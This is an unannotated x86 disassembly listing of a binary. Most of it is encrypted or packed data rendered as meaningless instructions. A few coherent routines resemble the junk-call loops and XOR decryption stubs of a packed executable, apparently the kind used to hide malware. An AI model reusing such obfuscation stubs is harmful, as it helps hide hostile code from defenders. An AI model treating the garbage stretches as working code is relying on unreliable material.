  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x73de0451]
  4028ec:	or     BYTE PTR [ebx+0x7e085378],0x7e
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x40294a
  4028f8:	out    dx,eax
  4028f9:	gs jle 0x402893
  4028fc:	and    DWORD PTR [eax+ecx*2+0xbad57b6],edi
  402903:	cmp    ch,0x93
  402906:	gs mov edi,0x26b7f958
  40290c:	call   0xb5237de5
  402911:	sub    ebx,DWORD PTR [ecx+edx*1]
  402914:	or     DWORD PTR [ecx-0x1c],eax
  402917:	outs   dx,BYTE PTR ds:[esi]
  402918:	ins    BYTE PTR es:[edi],dx
  402919:	leave  
  40291a:	inc    ebp
  40291b:	fsubr  QWORD PTR [ecx]
  40291d:	and    BYTE PTR [eax],ah
  40291f:	mov    ebp,0x112726d
  402924:	test   al,0xf3
  402926:	out    dx,eax
  402927:	dec    eax
  402928:	loop   0x40291b
  40292a:	enter  0x9040,0xb4
  40292e:	cmp    BYTE PTR [edi-0x36],bl
  402931:	popa   
  402932:	in     al,dx
  402933:	xchg   BYTE PTR [eax-0x24],dh
  402936:	pop    esi
  402937:	jbe    0x402984
  402939:	mov    dl,0x42
  40293b:	lea    ebp,[eax]
  40293d:	inc    edi
  40293e:	fisub  WORD PTR [eax]
  402940:	leave  
  402941:	ret    
  402942:	out    0x9d,eax
  402944:	retf   0x613d
  402947:	scas   al,BYTE PTR es:[edi]
  402948:	fsub   QWORD PTR [edx]
  40294a:	mov    eax,0x1418205d
  40294f:	push   ecx
  402950:	mov    ebx,eax
  402952:	call   0x4bba:0xff14fea4
  402959:	es add al,0x21
  40295c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40295d:	int    0x1b
  40295f:	sub    DWORD PTR [edx-0x50be7b52],0x8265d69
  402969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40296a:	mov    cl,ah
  40296c:	test   BYTE PTR [esi-0x45],bl
  40296f:	clc    
  402970:	inc    ebx
  402971:	lea    edx,[eax]
  402973:	fist   WORD PTR [edi+0x223ea511]
  402979:	push   ds
  40297a:	fadd   DWORD PTR [esi]
  40297c:	add    dl,BYTE PTR [edx+0x607675f1]
  402982:	mov    ch,0x2d
  402984:	in     eax,dx
  402985:	das    
  402986:	push   ebx
  402987:	cld    
  402988:	mov    ds,WORD PTR [ecx+eiz*2]
  40298b:	or     BYTE PTR [ebx-0x2b],bh
  40298e:	arpl   WORD PTR [esi],si
  402990:	not    BYTE PTR [ecx]
  402992:	sbb    DWORD PTR [eax+0x21d8534b],esp
  402998:	cmp    DWORD PTR [ebx-0x11242b6f],esi
  40299e:	xor    al,0x32
  4029a0:	das    
  4029a1:	aam    0x90
  4029a3:	push   0xd14f1bcc
  4029a8:	mov    esi,0xe2ce5b46
  4029ad:	and    ah,ch
  4029af:	cli    
  4029b0:	add    dh,BYTE PTR [edx]
  4029b2:	in     al,0x8d
  4029b4:	pop    es
  4029b5:	jae    0x402958
  4029b7:	cmp    bh,dl
  4029b9:	sbb    BYTE PTR [ebx+ebp*8-0x58],bl
  4029bd:	sub    al,0xa9
  4029bf:	imul   ecx,DWORD PTR [esi+0x25],0xffffffb1
  4029c3:	(bad)  
  4029c4:	iret   
  4029c5:	fild   WORD PTR [ecx]
  4029c7:	inc    ebx
  4029c8:	test   DWORD PTR [ecx+eax*1],eax
  4029cb:	popf   
  4029cc:	call   0xb93e62b4
  4029d1:	mov    dh,0x11
  4029d3:	jecxz  0x4029de
  4029d5:	jo     0x40296c
  4029d7:	push   esi
  4029d8:	xchg   esp,eax
  4029d9:	stc    
  4029da:	lahf   
  4029db:	xor    ebp,DWORD PTR [edx+ebx*4-0x2f026ac6]
  4029e2:	cmp    BYTE PTR [edi-0x62],0x9
  4029e6:	cmp    DWORD PTR [edx-0x4116e9ec],esp
  4029ec:	sbb    DWORD PTR [esi+0x31],esp
  4029ef:	lea    ecx,[ebp-0x27]
  4029f2:	loope  0x402997
  4029f4:	jmp    0xe17f:0x6c1ffd10
  4029fb:	out    0x8f,eax
  4029fd:	aam    0x30
  4029ff:	fs and eax,edi
  402a02:	loop   0x402a59
  402a04:	and    al,0xe
  402a06:	jmp    0x8357:0x5e027696
  402a0d:	adc    ebp,DWORD PTR [esi]
  402a0f:	dec    eax
  402a10:	mov    esi,0x1c5196db
  402a15:	xchg   BYTE PTR [ecx+0x7258151],cl
  402a1b:	inc    edi
  402a1c:	inc    ebx
  402a1d:	add    BYTE PTR [eax],al
  402a1f:	add    BYTE PTR [eax],al
  402a21:	add    cl,ch
  402a23:	or     eax,0x8b000000
  402a28:	adc    eax,0x434707
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434707,edx
  402a34:	cmp    DWORD PTR ds:0x434707,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434707,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x434663
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434707,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434707
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434707,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x43467f,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x4346bb,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x4346f7,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x4346f7
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x4346f7,ecx
  402aac:	cmp    DWORD PTR ds:0x4346f7,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x4346f7,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43478f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x43477b
  402ae8:	or     DWORD PTR ds:0x434747,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x434737,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x434743,0x434683
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	bound  ecx,QWORD PTR [esi+0x973dd8e]
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b57
  402b2c:	mov    WORD PTR [ecx+0x63],gs
  402b2f:	pop    esi
  402b30:	(bad)
  402b33:	mov    ebx,DWORD PTR [edi-0x4b]
  402b36:	ds in  eax,dx
  402b38:	daa    
  402b39:	xor    BYTE PTR [edi+0x2b907d3],ah
  402b3f:	xor    ecx,DWORD PTR [esi+0x36b265fc]
  402b45:	jns    0x402bbf
  402b47:	test   eax,0xebd663
  402b4c:	inc    edx
  402b4d:	pushf  
  402b4e:	test   eax,0xbac7fa8a
  402b53:	and    ebp,DWORD PTR [eax-0x782008f6]
  402b59:	call   0x6226a71c
  402b5e:	or     BYTE PTR [ebx],bl
  402b60:	test   BYTE PTR [edx-0x3f],dh
  402b63:	or     eax,ebx
  402b65:	xchg   edx,eax
  402b66:	retf   0x72e1
  402b69:	mov    bh,0x91
  402b6b:	ss mov ch,0xd
  402b6e:	add    DWORD PTR [ebx+0x7e],edi
  402b71:	sbb    al,0x2e
  402b73:	jl     0x402bc4
  402b75:	js     0x402b90
  402b77:	aas    
  402b78:	jg     0x402b6d
  402b7a:	add    DWORD PTR [ebx-0x4d],0xf2467a9d
  402b81:	imul   edx,DWORD PTR [edx+0x19],0x2f58bc5c
  402b88:	aad    0xdf
  402b8a:	cmp    eax,0x77d32892
  402b8f:	mov    edx,0x6852175d
  402b94:	push   ecx
  402b95:	cmp    BYTE PTR [eax+0x7f],bh
  402b98:	mov    bl,0x13
  402b9a:	pop    ds
  402b9b:	ret    
  402b9c:	push   ds
  402b9d:	pop    esi
  402b9e:	jae    0x402c09
  402ba0:	lods   al,BYTE PTR ds:[esi]
  402ba1:	pop    ebx
  402ba2:	loope  0x402bf6
  402ba4:	and    ch,BYTE PTR [bx]
  402ba7:	inc    esi
  402ba8:	call   DWORD PTR [edx+ebp*8]
  402bab:	sub    dl,BYTE PTR [ebp+0x6f17fda1]
  402bb1:	sub    BYTE PTR [edx+0x6e],ch
  402bb4:	fiadd  DWORD PTR [ebx+0x76a03e6a]
  402bba:	and    eax,0xae36f57b
  402bbf:	jl     0x402c39
  402bc1:	jecxz  0x402bd4
  402bc3:	xchg   esi,eax
  402bc4:	sbb    DWORD PTR [ebp+0x50a8e055],esi
  402bca:	lahf   
  402bcb:	jb     0x402b98
  402bcd:	xor    eax,0x56ea0a77
  402bd2:	pop    ds
  402bd3:	jb     0x402b68
  402bd5:	stos   BYTE PTR es:[edi],al
  402bd6:	mov    eax,ds:0xc286f3b7
  402bdb:	fcomp  DWORD PTR [esi]
  402bdd:	push   esi
  402bde:	cld    
  402bdf:	push   edi
  402be0:	ins    BYTE PTR es:[edi],dx
  402be1:	pop    edx
  402be2:	fwait
  402be3:	xor    al,0x94
  402be5:	vmwrite ebx,DWORD PTR cs:[bx+si]
  402bea:	mov    gs,WORD PTR [ebx+eax*4]
  402bed:	pop    edx
  402bee:	fwait
  402bef:	xor    DWORD PTR [esi+0x26],ecx
  402bf2:	sbb    eax,0xcfc7a365
  402bf7:	lea    esp,[eax-0x172e47bb]
  402bfd:	sbb    al,0x6b
  402bff:	stc    
  402c00:	sbb    ebp,eax
  402c02:	dec    ebx
  402c03:	cld    
  402c04:	enter  0x1cb3,0x77
  402c08:	icebp  
  402c09:	dec    esi
  402c0a:	jp     0x402c2a
  402c0c:	shl    al,0x65
  402c0f:	jbe    0x402c63
  402c11:	pop    esp
  402c12:	and    al,0x34
  402c14:	jecxz  0x402c88
  402c16:	and    ebx,esi
  402c18:	dec    ecx
  402c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1a:	daa    
  402c1b:	sbb    esi,DWORD PTR [esi+0x28314a61]
  402c21:	pop    sp
  402c23:	sub    al,0xb1
  402c25:	enter  0x2fd,0x88
  402c29:	ins    BYTE PTR es:[edi],dx
  402c2a:	mov    cs,esp
  402c2c:	inc    edi
  402c2d:	push   cs
  402c2e:	popa   
  402c2f:	imul   DWORD PTR [edi+0x4]
  402c32:	loop   0x402c48
  402c34:	fiadd  DWORD PTR [ecx+0x32]
  402c37:	add    eax,0x8f78fd7b
  402c3c:	mov    ds:0xe6ad2d81,al
  402c41:	fs jl  0x402c49
  402c44:	dec    ebx
  402c45:	addr16 icebp 
  402c47:	push   ebx
  402c48:	cmp    BYTE PTR [eax+0x6f],dl
  402c4b:	add    edx,esi
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434687,0x0
  402c5f:	mov    eax,ds:0x434687
  402c64:	inc    eax
  402c65:	mov    ds:0x434687,eax
  402c6a:	cmp    DWORD PTR ds:0x434687,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434687,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x434667,0x434793
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	mov    esi,0x13eee2aa
  402ceb:	or     edi,DWORD PTR [esi+0x7e]
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402cd5
  402cf3:	add    BYTE PTR [esi],al
  402cf5:	enter  0x5cf9,0x17
  402cf9:	clc    
  402cfa:	fidivr DWORD PTR [edx-0x6501c242]
  402d00:	and    BYTE PTR [eax+0x7fe8df99],0xe9
  402d07:	shl    BYTE PTR [eax+0x2],1
  402d0a:	cmp    dl,al
  402d0c:	jae    0x402d03
  402d0e:	lea    esi,[ebx+0x703b318f]
  402d14:	stos   DWORD PTR es:[edi],eax
  402d15:	jnp    0x402cd4
  402d17:	ins    DWORD PTR es:[edi],dx
  402d18:	fwait
  402d19:	adc    cl,BYTE PTR [edi+ebx*4]
  402d1c:	xor    dh,BYTE PTR [ebx]
  402d1e:	jae    0x402d1b
  402d20:	mov    eax,0x2ac18bc9
  402d25:	mov    cl,0xa3
  402d27:	js     0x402cc1
  402d29:	inc    esp
  402d2a:	scas   al,BYTE PTR es:[edi]
  402d2b:	(bad)  
  402d2c:	aaa    
  402d2d:	xchg   ecx,eax
  402d2e:	daa    
  402d2f:	add    al,0x19
  402d31:	sti    
  402d32:	jnp    0x402d3f
  402d34:	icebp  
  402d35:	test   DWORD PTR [edx],0xfa5d7f78
  402d3b:	pop    edi
  402d3c:	in     al,0x2d
  402d3e:	dec    ebp
  402d3f:	jle    0x402d0d
  402d41:	xor    DWORD PTR [eax-0x24],ecx
  402d44:	and    BYTE PTR [esi-0x3ee4c3ea],bh
  402d4a:	inc    ecx
  402d4b:	push   edx
  402d4c:	adc    eax,0x72d0654f
  402d51:	sti    
  402d52:	cwde   
  402d53:	and    BYTE PTR [eax-0x21],cl
  402d56:	or     dh,al
  402d58:	ret    0xacec
  402d5b:	dec    edi
  402d5c:	dec    ecx
  402d5d:	pop    ss
  402d5e:	xor    DWORD PTR [ecx],0xba76e717
  402d64:	xchg   esp,eax
  402d65:	and    ecx,ecx
  402d67:	fwait
  402d68:	test   BYTE PTR [edi-0x1c22c203],dl
  402d6e:	fwait
  402d6f:	addr16 push esi
  402d71:	inc    ebx
  402d72:	xchg   ebx,eax
  402d73:	outs   dx,BYTE PTR ds:[esi]
  402d74:	loope  0x402d4b
  402d76:	cmc    
  402d77:	lea    esi,[edx]
  402d79:	psubw  mm2,mm1
  402d7c:	cli    
  402d7d:	push   ecx
  402d7e:	stc    
  402d7f:	jmp    0xafaa390f
  402d84:	sbb    dh,BYTE PTR [ecx+0x23c05a07]
  402d8a:	pushf  
  402d8b:	inc    ebx
  402d8c:	inc    edi
  402d8d:	or     BYTE PTR [ebx],cl
  402d8f:	sbb    DWORD PTR [eax+0x5e4f0359],0xffffffe7
  402d96:	das    
  402d97:	dec    esp
  402d98:	mov    ds:0x479914f1,al
  402d9d:	jle    0x402e1d
  402d9f:	push   ds
  402da0:	(bad)  
  402da1:	mov    ds:0x107a6e54,eax
  402da6:	push   ebx
  402da7:	adc    BYTE PTR [ebp-0x51],cl
  402daa:	ret    0xd866
  402dad:	arpl   WORD PTR [ebx+0x461d38f5],si
  402db3:	inc    ebp
  402db4:	and    cl,bl
  402db6:	inc    ecx
  402db7:	fnsave [ecx+0x60]
  402dba:	loop   0x402dee
  402dbc:	mov    edx,0x5a8135d3
  402dc1:	push   esp
  402dc2:	pop    ss
  402dc3:	xor    DWORD PTR ds:0x80be66d0,esp
  402dc9:	xor    edx,DWORD PTR [ecx-0x65]
  402dcc:	or     BYTE PTR [edi],bl
  402dce:	sub    dh,BYTE PTR [edi+0x17]
  402dd1:	jmp    0x5c73:0x1e633fc3
  402dd8:	xor    ch,bl
  402dda:	adc    eax,0xe67e6da8
  402ddf:	cmc    
  402de0:	mov    edi,0x7ea8b57f
  402de5:	xor    esp,DWORD PTR [eax+0x1a2cb78d]
  402deb:	fsub   QWORD PTR [ebp+0x6b4d03f2]
  402df1:	jmp    0xf1b06caa
  402df6:	cmp    ebx,DWORD PTR [edx+esi*1]
  402df9:	mov    ds:0xe7b98e5c,eax
  402dfe:	sbb    ah,BYTE PTR [edi]
  402e00:	cmp    DWORD PTR [ecx+0x7c],0x4df58bb3
  402e07:	jae    0x402e51
  402e09:	cmp    ebp,ebx
  402e0b:	in     eax,0x95
  402e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e0e:	mov    cl,0xa2
  402e10:	retf   0x8bb0
  402e13:	pop    ebp
  402e14:	or     al,0x33
  402e16:	rol    DWORD PTR [ebx],0xc2
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x4346f7,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    bl,bl
  402e93:	xchg   DWORD PTR ds:0x7e1433e5,ecx
  402e99:	jle    0x402ef1
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402e44
  402e9f:	mov    al,0x5d
  402ea1:	rcl    esi,0x8a
  402ea4:	xor    dh,dl
  402ea6:	xchg   DWORD PTR [edi+0x2aa4a37f],esp
  402eac:	sub    eax,0xa072aee
  402eb1:	add    BYTE PTR [ebx],dl
  402eb3:	in     eax,0x9
  402eb5:	popa   
  402eb6:	inc    esp
  402eb7:	jnp    0x402ef7
  402eb9:	mov    ebp,0x1ea0fc73
  402ebe:	sbb    BYTE PTR ds:0x9843bc62,0x25
  402ec5:	call   0x6f37:0xaac02c4d
  402ecc:	shl    DWORD PTR [ebx],1
  402ece:	fist   DWORD PTR [ecx+0x29]
  402ed1:	in     eax,0x7
  402ed3:	pop    eax
  402ed4:	or     DWORD PTR [eax+ebp*2],edi
  402ed7:	adc    eax,0x4c4df4ad
  402edc:	jmp    0x402edf
  402ede:	cld    
  402edf:	mov    ch,0x28
  402ee1:	fs xchg edx,eax
  402ee3:	cli    
  402ee4:	lds    ebx,FWORD PTR [ebx+0x11]
  402ee7:	int    0xae
  402ee9:	sub    eax,0x3b01a14
  402eee:	je     0x402e86
  402ef0:	sbb    eax,0x6084d6f7
  402ef5:	pop    esi
  402ef6:	and    edi,esp
  402ef8:	sub    eax,0xab4fefc9
  402efd:	dec    esi
  402efe:	push   ds
  402eff:	aad    0x65
  402f01:	leave  
  402f02:	push   edx
  402f03:	dec    ebx
  402f04:	add    al,cl
  402f06:	lea    eax,[eax-0x43]
  402f09:	pop    es
  402f0a:	test   BYTE PTR [ebp+0x8],dh
  402f0d:	addr16 push ss
  402f0f:	xchg   edx,eax
  402f10:	push   es
  402f11:	push   cs
  402f12:	or     ah,dl
  402f14:	ficom  DWORD PTR [esi]
  402f16:	pop    ebx
  402f17:	push   ebp
  402f18:	rcl    DWORD PTR [ecx+0x1857a2ca],cl
  402f1e:	out    dx,eax
  402f1f:	hlt    
  402f20:	pop    ss
  402f21:	into   
  402f22:	icebp  
  402f23:	sub    edi,ebp
  402f25:	push   0xb1a48dd5
  402f2a:	cmp    eax,0x20963b5a
  402f2f:	into   
  402f30:	ins    BYTE PTR es:[edi],dx
  402f31:	mov    edx,0xb07c7444
  402f36:	inc    edx
  402f37:	shl    BYTE PTR [edx-0x19],1
  402f3a:	and    al,0xf9
  402f3c:	sub    al,0x4e
  402f3e:	cwde   
  402f3f:	or     BYTE PTR [eax-0x15],0xe3
  402f43:	mov    ds:0xfbf80ffa,eax
  402f48:	mov    eax,0x4d88094e
  402f4d:	jns    0x402fb7
  402f4f:	icebp  
  402f50:	hlt    
  402f51:	sub    BYTE PTR [edi+0x24],dh
  402f54:	push   ebp
  402f55:	lods   eax,DWORD PTR ds:[esi]
  402f56:	jmp    0x402f15
  402f58:	in     eax,0xda
  402f5a:	fwait
  402f5b:	inc    ecx
  402f5c:	sub    eax,0xf07de66b
  402f61:	dec    ecx
  402f62:	addr16 push edi
  402f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f65:	or     BYTE PTR [ecx],0x72
  402f68:	nop
  402f69:	mov    ch,bl
  402f6b:	xor    bl,ah
  402f6d:	hlt    
  402f6e:	mov    dh,0x90
  402f70:	iret   
  402f71:	adc    BYTE PTR fs:[edi-0x6c],0x22
  402f76:	in     al,dx
  402f77:	mov    esp,0xe89a2ee2
  402f7c:	mov    cl,0xdf
  402f7e:	daa    
  402f7f:	lods   al,BYTE PTR ds:[si]
  402f81:	push   ds
  402f82:	(bad)  [ebp+0x530016]
  402f88:	add    BYTE PTR [ecx+eiz*2-0x4ede9195],ch
  402f8f:	popa   
  402f90:	test   al,0x43
  402f92:	loope  0x402fb2
  402f94:	cmp    BYTE PTR [eax],ah
  402f96:	clc    
  402f97:	xchg   edi,eax
  402f98:	and    ch,BYTE PTR [esi-0x13]
  402f9b:	inc    ecx
  402f9c:	mov    cl,0xbc
  402f9e:	fnsave [ebx+0x34e848d2]
  402fa4:	mov    ch,BYTE PTR [edx-0x12]
  402fa7:	pop    esi
  402fa8:	jp     0x402fb6
  402faa:	mov    ecx,0x1667440b
  402faf:	pop    ecx
  402fb0:	fstp   TBYTE PTR [ecx-0x1d4c00b0]
  402fb6:	das    
  402fb7:	add    al,0x2b
  402fb9:	mov    ds:0x57304ab0,eax
  402fbe:	jne    0x402f9a
  402fc0:	in     al,dx
  402fc1:	push   eax
  402fc2:	sti    
  402fc3:	repz mov ecx,0xe30b979b
  402fc9:	add    eax,0x40afdc5
  402fce:	ror    DWORD PTR [ecx-0x6a6e58a4],1
  402fd4:	(bad)  
  402fd6:	stos   DWORD PTR es:[edi],eax
  402fd7:	ins    BYTE PTR es:[edi],dx
  402fd8:	push   edx
  402fd9:	(bad)  
  402fda:	or     al,0x9c
  402fdc:	mov    ecx,ss
  402fde:	push   ss
  402fdf:	clc    
  402fe0:	sub    BYTE PTR [esi+0x2790f06c],ch
  402fe6:	adc    eax,DWORD PTR [edx+0x5e]
  402fe9:	out    dx,eax
  402fea:	popf   
  402feb:	cld    
  402fec:	push   eax
  402fed:	in     al,0xb7
  402fef:	jmp    0x48a9dfa
  402ff4:	test   DWORD PTR [edx+ebx*8],0x17285587
  402ffb:	mov    ds:0x2018f164,eax
  403000:	aas    
  403001:	sub    al,0xf8
  403003:	into   
  403004:	mov    BYTE PTR [edx+0x6d33f49c],ch
  40300a:	or     BYTE PTR [ecx+0x23],al
  40300d:	daa    
  40300e:	xor    bl,BYTE PTR [ecx-0x67]
  403011:	out    dx,eax
  403012:	cld    
  403013:	jb     0x402fe3
  403015:	loope  0x40308a
  403017:	neg    DWORD PTR [ebx+ecx*2]
  40301a:	sub    DWORD PTR [ebx-0xa1adb44],edx
  403020:	popf   
  403021:	aaa    
  403022:	mov    eax,ds:0xe8a79036
  403027:	mov    bl,0x8
  403029:	daa    
  40302a:	in     al,0x55
  40302c:	xor    al,0x13
  40302e:	pop    ds
  40302f:	cmc    
  403030:	sub    ch,dl
  403032:	popf   
  403033:	div    ch
  403035:	add    ecx,DWORD PTR gs:[esi-0x5f2d072f]
  40303c:	add    cl,BYTE PTR [edi]
  40303e:	lods   eax,DWORD PTR ds:[esi]
  40303f:	jo     0x403040
  403041:	pop    esi
  403042:	lea    edi,[ebp+0x3f]
  403045:	jecxz  0x402fde
  403047:	lods   eax,DWORD PTR ds:[esi]
  403048:	in     al,0x63
  40304a:	cld    
  40304b:	mov    ch,0xa6
  40304d:	fistp  QWORD PTR [ebx]
  40304f:	test   eax,0x8df34d2d
  403054:	inc    ecx
  403055:	cmp    BYTE PTR [edx+0x100bdc73],cl
  40305b:	je     0x402fe5
  40305d:	shl    DWORD PTR [esi],cl
  40305f:	mov    eax,ds:0xb0e35ebd
  403064:	inc    edx
  403065:	int    0xd9
  403067:	stos   DWORD PTR es:[edi],eax
  403068:	add    ebp,DWORD PTR [esi]
  40306a:	fwait
  40306b:	sbb    al,0xee
  40306d:	icebp  
  40306e:	or     BYTE PTR ds:0xf8aaea34,0x22
  403075:	retf   0x4d8f
  403078:	(bad)  
  403079:	pop    esi
  40307a:	cmp    DWORD PTR [ecx+0x7c307d7a],0x8
  403081:	push   eax
  403082:	in     eax,dx
  403083:	shr    DWORD PTR [ecx+0x6754d088],cl
  403089:	aas    
  40308a:	jp     0x40307b
  40308c:	in     eax,0xd7
  40308e:	or     DWORD PTR [eax],ecx
  403090:	mov    ah,BYTE PTR [eax-0x70]
  403093:	dec    esi
  403094:	and    eax,0xeb95bcb3
  403099:	inc    ecx
  40309a:	bound  esi,QWORD PTR [ecx-0x5f20ab04]
  4030a0:	sbb    eax,DWORD PTR [ebx-0x7b]
  4030a3:	(bad)  
  4030a4:	hlt    
  4030a5:	jmp    0xf788:0xccdb3766
  4030ac:	fdivr  st,st(3)
  4030ae:	test   DWORD PTR [esi-0x14],ecx
  4030b1:	scas   al,BYTE PTR es:[edi]
  4030b2:	jns    0x403034
  4030b4:	add    al,0x58
  4030b6:	dec    ebx
  4030b7:	adc    eax,0xcbaa83b6
  4030bc:	aam    0xf3
  4030be:	scas   al,BYTE PTR es:[edi]
  4030bf:	mov    cl,0xa6
  4030c1:	out    0x9a,al
  4030c3:	pushf  
  4030c4:	cdq    
  4030c5:	dec    esi
  4030c6:	push   edi
  4030c7:	inc    eax
  4030c8:	xlat   BYTE PTR ds:[ebx]
  4030c9:	pop    ds
  4030ca:	mov    ebp,DWORD PTR [esi]
  4030cc:	addr16 mov ecx,0xd80b97ee
  4030d2:	xchg   edi,eax
  4030d3:	mov    es,edx
  4030d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030d6:	add    BYTE PTR [eax-0x31],bh
  4030d9:	aam    0xe2
  4030db:	xchg   esi,eax
  4030dc:	cs jae 0x403141
  4030df:	sub    eax,0x54adc022
  4030e4:	cld    
  4030e5:	(bad)  
  4030e6:	div    esp
  4030e8:	ja     0x403166
  4030ea:	sbb    al,0x67
  4030ec:	inc    esp
  4030ed:	ins    DWORD PTR es:[edi],dx
  4030ee:	loope  0x4030f3
  4030f0:	jg     0x4030b0
  4030f2:	add    eax,0x5a9f9087
  4030f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f8:	in     al,0xad
  4030fa:	cmp    DWORD PTR gs:[edx],0xb2ae174b
  403101:	xchg   esi,eax
  403102:	popa   
  403103:	adc    ecx,DWORD PTR [ebx-0x2b]
  403106:	sub    al,0x5d
  403108:	push   edx
  403109:	loop   0x403114
  40310b:	mov    ecx,0xf3440016
  403110:	outs   dx,DWORD PTR ds:[esi]
  403111:	retf   
  403112:	stos   DWORD PTR es:[edi],eax
  403113:	(bad)  
  403114:	cmc    
  403115:	pop    ds
  403116:	and    al,0x57
  403118:	mov    ebp,DWORD PTR [ebx]
  40311a:	fldcw  WORD PTR [edi+0x59a4d01f]
  403120:	pop    esi
  403121:	in     al,0x75
  403123:	stc    
  403124:	jg     0x4030ef
  403126:	into   
  403127:	add    BYTE PTR [ecx-0x44082b1d],ah
  40312d:	(bad)  
  40312e:	into   
  40312f:	or     dh,BYTE PTR [edx+ebp*4-0x3a]
  403133:	cs xor ch,dh
  403136:	jge    0x403125
  403138:	int    0x8c
  40313a:	std    
  40313b:	xchg   edx,eax
  40313c:	push   ebx
  40313d:	cdq    
  40313e:	les    edx,FWORD PTR [edi-0x62]
  403141:	push   ss
  403142:	push   0xffffffea
  403144:	xor    BYTE PTR [ebp-0x5a5a1531],al
